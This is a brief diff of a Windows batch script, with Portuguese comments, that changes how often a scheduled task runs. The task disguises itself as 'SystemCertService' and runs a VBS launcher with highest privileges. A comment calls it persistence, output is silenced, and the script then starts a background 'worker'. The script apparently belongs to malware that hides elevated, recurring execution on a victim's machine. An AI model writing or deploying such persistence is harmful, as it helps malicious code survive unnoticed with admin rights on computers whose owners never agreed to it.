@@ -49,10 +49,10 @@ if not exist "%shortcutPath%" (
          $s.Save()" >nul 2>&1
 )
 
-:: 3. Persistência via Tarefa Agendada rodando a cada 10 minutos com privilégios elevados
+:: 3. Persistência via Tarefa Agendada rodando a cada 35 minutos com privilégios elevados
 schtasks /query /tn "SystemCertService" >nul 2>&1
 if %errorlevel% neq 0 (
-    schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 10 /rl HIGHEST /f >nul
+    schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 35 /rl HIGHEST /f >nul
 )
 
 :: Inicia o worker, se existir, em background com prioridade alta
